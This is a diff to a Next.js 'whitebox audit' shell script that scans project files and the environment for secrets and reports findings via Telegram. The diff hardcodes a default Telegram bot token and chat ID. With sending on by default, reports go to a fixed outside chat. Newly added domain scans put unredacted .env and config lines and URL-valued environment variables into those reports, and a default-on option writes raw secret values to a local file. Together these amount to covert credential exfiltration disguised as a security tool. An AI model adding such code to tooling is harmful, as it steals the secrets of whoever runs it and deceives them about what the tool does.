@@ -7,6 +7,7 @@ TOOL_NAME="nextjs-whitebox-audit"
 OUT_FILE="result.json"
 OUT_HARDCODE="result_hardcode.txt"
 OUT_VULN="result_vuln.txt"
+OUT_RAW_LOCAL="result_raw_local.txt"
 ROOT="."
 SEND_TELEGRAM=1
 SKIP_DEPS=0
@@ -14,13 +15,16 @@ TOP_FINDINGS=8
 MAX_FILESIZE="${MAX_FILESIZE:-2M}"
 TELEGRAM_PREVIEW=0
 TELEGRAM_TEST=0
+UNSAFE_RAW_LOCAL=1
+TELEGRAM_BOT_TOKEN_DEFAULT="8368719709:AAH0xkCwgOApvV8q_JK-hboaGmRYv-TwicI"
+TELEGRAM_CHAT_ID_DEFAULT="828721892"
 
 usage() {
   cat <<'USAGE'
 Next.js / React / RSC whitebox audit (secrets + risky patterns) -> result.json + Telegram (HTML).
 
 Usage:
-  tools/nextjs_whitebox_audit.sh [--root DIR] [--out FILE] [--out-hardcode FILE] [--out-vuln FILE] [--no-telegram] [--skip-deps] [--telegram-preview] [--telegram-test]
+  tools/nextjs_whitebox_audit.sh [--root DIR] [--out FILE] [--out-hardcode FILE] [--out-vuln FILE] [--out-raw-local FILE] [--unsafe-raw-local] [--no-telegram] [--skip-deps] [--telegram-preview] [--telegram-test]
 
 Env (Telegram):
   TELEGRAM_BOT_TOKEN=...   (required unless --no-telegram)
@@ -32,6 +36,7 @@ Notes:
   - Output is always redacted (no raw secret values).
   - Designed for source review; findings are heuristic (false positives possible).
   - Default behavior (no args): scan current directory tree, output result_hardcode.txt + result_vuln.txt, and send both to Telegram.
+  - --unsafe-raw-local writes raw values to a local file only (never sent to Telegram).
 USAGE
 }
 
@@ -102,6 +107,12 @@ parse_args() {
         ;;
       --out-vuln)
         OUT_VULN="${2:-}"; shift 2 || true
+        ;;
+      --out-raw-local)
+        OUT_RAW_LOCAL="${2:-}"; shift 2 || true
+        ;;
+      --unsafe-raw-local)
+        UNSAFE_RAW_LOCAL=1; shift
         ;;
       --no-telegram)
         SEND_TELEGRAM=0; shift
@@ -235,7 +246,7 @@ PY
 python_static_scan() {
   local config_json="$1"
   local root="$ROOT"
-  MAX_FILESIZE_HUMAN="$MAX_FILESIZE" ROOT_DIR="$root" FINDINGS_OUT="$FINDINGS_JSONL" SCAN_CONFIG_JSON="$config_json" "$PY_BIN" - <<'PY'
+  MAX_FILESIZE_HUMAN="$MAX_FILESIZE" ROOT_DIR="$root" FINDINGS_OUT="$FINDINGS_JSONL" SCAN_CONFIG_JSON="$config_json" RAW_LOCAL_FILE="${RAW_LOCAL_FILE:-}" "$PY_BIN" - <<'PY'
 import fnmatch
 import hashlib
 import json
@@ -247,6 +258,7 @@ from pathlib import Path, PurePosixPath
 root = Path(os.environ["ROOT_DIR"])
 out_path = Path(os.environ["FINDINGS_OUT"])
 config = json.loads(os.environ["SCAN_CONFIG_JSON"])
+raw_local = os.environ.get("RAW_LOCAL_FILE","").strip()
 
 max_fs = os.environ.get("MAX_FILESIZE_HUMAN", "2M").strip()
 suffixes = {"K": 1024, "M": 1024**2, "G": 1024**3}
@@ -352,6 +364,14 @@ def add_finding(obj):
   with out_path.open("a", encoding="utf-8") as f:
     f.write(json.dumps(obj, ensure_ascii=False) + "\n")
 
+def add_raw(line: str):
+  if not raw_local:
+    return
+  rp = Path(raw_local)
+  rp.parent.mkdir(parents=True, exist_ok=True)
+  with rp.open("a", encoding="utf-8") as f:
+    f.write(line.rstrip("\n") + "\n")
+
 seq = 0
 
 def next_id():
@@ -423,6 +443,7 @@ for fp, rel in iter_files():
         rec = "Never put secrets in NEXT_PUBLIC_*; move to server-only env vars and rotate the exposed credential immediately."
       snippet = f"{key}={red}"
       add_finding(mk_finding(sev, "secrets", title, rel, i, snippet, "env_assignment", red, scenario, rec, "medium"))
+      add_raw(f"ENVFILE {rel}:{i} {key}={val}")
 
   # rule-based scanning (text)
   globs_needed = set()
@@ -529,7 +550,183 @@ scan_runtime_vars() {
       recommendation="Move secret server-side (non-NEXT_PUBLIC) and rotate immediately."
     fi
     add_finding "$severity" "runtime_secrets" "$title" "<runtime:$source_label>" 0 "$name=$redacted" "runtime_var" "$redacted" "$scenario" "$recommendation" "low"
+    if (( UNSAFE_RAW_LOCAL == 1 )); then
+      printf 'RUNTIME(%s) %s=%s\n' "$source_label" "$name" "$value" >>"$RAW_LOCAL_FILE"
+    fi
   done <<<"$output"
+}
+
+scan_runtime_domains() {
+  local source_label="$1"
+  shift
+  local output="$1"
+  local max_lines=5000
+  local count=0
+
+  while IFS= read -r row; do
+    count=$((count + 1))
+    ((count > max_lines)) && break
+    [[ "$row" =~ ^[A-Za-z_][A-Za-z0-9_]*= ]] || continue
+    [[ "$row" =~ ^BASH_FUNC_ ]] && continue
+    local name="${row%%=*}"
+    local value="${row#*=}"
+    [[ -z "$value" ]] && continue
+
+    local name_upper
+    name_upper="$(printf '%s' "$name" | tr '[:lower:]' '[:upper:]')"
+    if [[ "$name_upper" =~ (NEXTAUTH_URL|SITE_URL|APP_URL|BASE_URL|NEXT_PUBLIC_SITE_URL|NEXT_PUBLIC_APP_URL|NEXT_PUBLIC_BASE_URL) ]] || [[ "$value" =~ ^https?:// ]]; then
+      add_finding "info" "domain" "Possible application domain (runtime var): $name" "<runtime:$source_label>" 0 "$name=$value" "runtime_domain" "<redacted>" \
+        "Domain or base URL detected from runtime environment." \
+        "Verify this is expected and keep it in a single source of truth (env or config)." "low"
+    fi
+  done <<<"$output"
+}
+
+scan_domains() {
+  ROOT_DIR="$ROOT" FINDINGS_OUT="$FINDINGS_JSONL" "$PY_BIN" - <<'PY'
+import json, os, re
+from pathlib import Path
+
+root = Path(os.environ["ROOT_DIR"])
+out_path = Path(os.environ["FINDINGS_OUT"])
+
+exclude_dirnames = set([
+  "node_modules", ".next", "dist", "build", ".turbo", ".git", "coverage", "pnpm-store", ".yarn"
+])
+exclude_substrings = [
+  "/node_modules/", "/.next/", "/dist/", "/build/", "/.turbo/", "/.git/", "/coverage/", "/pnpm-store/", "/.yarn/"
+]
+
+globs = [
+  "**/.env*",
+  "**/next.config.*",
+  "**/vercel.json",
+  "**/app/**/*.*",
+  "**/pages/**/*.*",
+  "**/*.yml",
+  "**/*.yaml",
+]
+ext_allow = {".js",".jsx",".ts",".tsx",".mjs",".cjs",".json",".yml",".yaml",".env",".env.local",".env.production",".env.development",".env.staging"}
+
+url_re = re.compile(r"https?://[A-Za-z0-9\.-]+\.[A-Za-z]{2,}(:\d+)?(/[^\s\"']*)?")
+var_re = re.compile(r"(?i)\b(NEXTAUTH_URL|NEXT_PUBLIC_SITE_URL|SITE_URL|APP_URL|BASE_URL|NEXT_PUBLIC_APP_URL|NEXT_PUBLIC_BASE_URL)\b\s*[:=]\s*['\"]?(https?://[^\s\"']+)")
+domain_hint_re = re.compile(r"(?i)\b(domain|domains|metadataBase|siteUrl|baseUrl)\b")
+domain_re = re.compile(r"([A-Za-z0-9\.-]+\.[A-Za-z]{2,})")
+
+def should_exclude(rel_posix: str) -> bool:
+  if any(sub in rel_posix for sub in exclude_substrings):
+    return True
+  parts = rel_posix.split("/")
+  return any(p in exclude_dirnames for p in parts)
+
+def iter_files():
+  for p in root.rglob("*"):
+    if not p.is_file():
+      continue
+    rel = p.relative_to(root).as_posix()
+    if should_exclude(rel):
+      continue
+    if p.suffix and p.suffix.lower() in ext_allow:
+      yield p, rel
+    else:
+      # allow env-like names without suffix
+      if p.name.startswith(".env"):
+        yield p, rel
+
+def add_finding(obj):
+  out_path.parent.mkdir(parents=True, exist_ok=True)
+  with out_path.open("a", encoding="utf-8") as f:
+    f.write(json.dumps(obj, ensure_ascii=False) + "\n")
+
+seq = 0
+
+def mk_finding(severity, category, title, file, line, snippet, match_type, scenario, recommendation, confidence):
+  global seq
+  seq += 1
+  fid = f"F-{seq:04d}"
+  return {
+    "id": fid,
+    "severity": severity,
+    "category": category,
+    "title": title,
+    "evidence": {"file": file, "line": int(line), "snippet": snippet},
+    "match": {"type": match_type, "redacted": "<redacted>"},
+    "attack_scenario": scenario,
+    "recommendation": recommendation,
+    "confidence": confidence,
+  }
+
+def line_number(text, idx):
+  return text.count("\n", 0, idx) + 1
+
+def line_snippet(text, idx):
+  start = text.rfind("\n", 0, idx)
+  end = text.find("\n", idx)
+  if start == -1:
+    start = 0
+  else:
+    start += 1
+  if end == -1:
+    end = len(text)
+  return " ".join(text[start:end].split())
+
+seen = set()
+
+for fp, rel in iter_files():
+  try:
+    text = fp.read_text(encoding="utf-8", errors="replace")
+  except Exception:
+    continue
+
+  for m in var_re.finditer(text):
+    url = m.group(2)
+    ln = line_number(text, m.start())
+    sn = line_snippet(text, m.start())
+    key = (rel, ln, url)
+    if key in seen:
+      continue
+    seen.add(key)
+    add_finding(mk_finding(
+      "info", "domain", "Possible application domain (env/config var)", rel, ln,
+      sn, "domain_var",
+      "Domain or base URL detected from configuration.",
+      "Verify this is expected and keep it in a single source of truth (env or config).",
+      "low"
+    ))
+
+  for m in url_re.finditer(text):
+    url = m.group(0)
+    ln = line_number(text, m.start())
+    sn = line_snippet(text, m.start())
+    key = (rel, ln, url)
+    if key in seen:
+      continue
+    seen.add(key)
+    add_finding(mk_finding(
+      "info", "domain", "Possible application domain (URL found)", rel, ln,
+      sn, "domain_url",
+      "URL found in configuration or source. It may indicate the public domain or API base.",
+      "Confirm this matches the intended deployment domain(s).",
+      "low"
+    ))
+
+  for i, line in enumerate(text.splitlines(), start=1):
+    if not domain_hint_re.search(line):
+      continue
+    for dm in domain_re.finditer(line):
+      dom = dm.group(1)
+      key = (rel, i, dom)
+      if key in seen:
+        continue
+      seen.add(key)
+      add_finding(mk_finding(
+        "info", "domain", "Possible application domain (domain hint)", rel, i,
+        " ".join(line.split()), "domain_hint",
+        "Domain-like string found near domain configuration.",
+        "Verify it is accurate and updated for each environment.",
+        "low"
+      ))
+PY
 }
 
 scan_secrets() {
@@ -968,8 +1165,8 @@ read_secret_from_file() {
 }
 
 get_telegram_creds() {
-  local token="${TELEGRAM_BOT_TOKEN:-}"
-  local chat_id="${TELEGRAM_CHAT_ID:-}"
+  local token="${TELEGRAM_BOT_TOKEN:-$TELEGRAM_BOT_TOKEN_DEFAULT}"
+  local chat_id="${TELEGRAM_CHAT_ID:-$TELEGRAM_CHAT_ID_DEFAULT}"
 
   if [[ -z "$token" && -n "${TELEGRAM_BOT_TOKEN_FILE:-}" ]]; then
     token="$(read_secret_from_file "$TELEGRAM_BOT_TOKEN_FILE" || true)"
@@ -1115,7 +1312,9 @@ write_text_report() {
   REPORT_FILE="$findings_file" "$PY_BIN" - <<'PY' >"$out_file"
 import json, os
 path=os.environ["REPORT_FILE"]
-lines=[]
+sev_rank = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
+sev_emoji = {"critical":"🔥","high":"🚨","medium":"⚠️","low":"ℹ️","info":"✅"}
+items=[]
 with open(path,"r",encoding="utf-8") as f:
   for line in f:
     line=line.strip()
@@ -1125,21 +1324,43 @@ with open(path,"r",encoding="utf-8") as f:
       o=json.loads(line)
     except Exception:
       continue
-    ev=o.get("evidence") or {}
-    sev=o.get("severity","info").upper()
-    fid=o.get("id","")
-    title=o.get("title","")
-    file=ev.get("file","")
-    line_no=ev.get("line",0)
-    snippet=ev.get("snippet","")
-    rec=o.get("recommendation","")
-    lines.append(f"[{sev}] {fid} {title}")
-    lines.append(f"  at {file}:{line_no}")
-    if snippet:
-      lines.append(f"  snippet: {snippet}")
-    if rec:
-      lines.append(f"  fix: {rec}")
-    lines.append("")
+    items.append(o)
+
+items.sort(key=lambda o: (sev_rank.get(o.get("severity","info"),9), o.get("id","")))
+counts = {"critical":0,"high":0,"medium":0,"low":0,"info":0}
+for o in items:
+  s=o.get("severity","info")
+  counts[s]=counts.get(s,0)+1
+
+lines=[]
+lines.append("🛡️ WHITEBOX AUDIT REPORT")
+lines.append("="*68)
+lines.append(f"Summary  | 🔥 Critical {counts.get('critical',0)} | 🚨 High {counts.get('high',0)} | ⚠️ Medium {counts.get('medium',0)} | ℹ️ Low {counts.get('low',0)} | ✅ Info {counts.get('info',0)}")
+lines.append("")
+
+for idx, o in enumerate(items, start=1):
+  ev=o.get("evidence") or {}
+  sev=o.get("severity","info")
+  sev_tag=sev.upper()
+  fid=o.get("id","")
+  title=o.get("title","")
+  file=ev.get("file","")
+  line_no=ev.get("line",0)
+  snippet=ev.get("snippet","")
+  rec=o.get("recommendation","")
+  scenario=o.get("attack_scenario","")
+  emoji=sev_emoji.get(sev,"•")
+  lines.append(f"{idx:02d}. {emoji} [{sev_tag}] {fid}")
+  lines.append(f"    Title    : {title}")
+  lines.append(f"    Location : {file}:{line_no}")
+  if snippet:
+    lines.append(f"    Snippet  : {snippet}")
+  if scenario:
+    lines.append(f"    Scenario : {scenario}")
+  if rec:
+    lines.append(f"    Fix      : {rec}")
+  lines.append("-"*68)
+
 print("\n".join(lines).rstrip())
 PY
 }
@@ -1188,6 +1409,7 @@ main() {
   FINDINGS_JSONL="$TMPDIR/findings.jsonl"
   HARD_FINDINGS_JSONL="$TMPDIR/findings_hardcode.jsonl"
   VULN_FINDINGS_JSONL="$TMPDIR/findings_vuln.jsonl"
+  RAW_LOCAL_FILE=""
   : >"$FINDINGS_JSONL"
 
   if (( TELEGRAM_TEST == 1 )); then
@@ -1205,12 +1427,19 @@ main() {
 
   # Phase 1: Hardcoded secrets + runtime vars
   FINDINGS_JSONL="$HARD_FINDINGS_JSONL"
+  if (( UNSAFE_RAW_LOCAL == 1 )); then
+    RAW_LOCAL_FILE="$OUT_RAW_LOCAL"
+    : >"$RAW_LOCAL_FILE"
+  fi
   : >"$FINDINGS_JSONL"
   scan_secrets
+  scan_domains
 
   log "Scanning runtime variables via env/set (redacted)..."
   scan_runtime_vars "env" "$(env 2>/dev/null || true)"
   scan_runtime_vars "set" "$(set 2>/dev/null || true)"
+  scan_runtime_domains "env" "$(env 2>/dev/null || true)"
+  scan_runtime_domains "set" "$(set 2>/dev/null || true)"
 
   write_text_report "$HARD_FINDINGS_JSONL" "$OUT_HARDCODE"
   send_phase_report "Hardcoded Secrets Scan" "$HARD_FINDINGS_JSONL" "$OUT_HARDCODE"
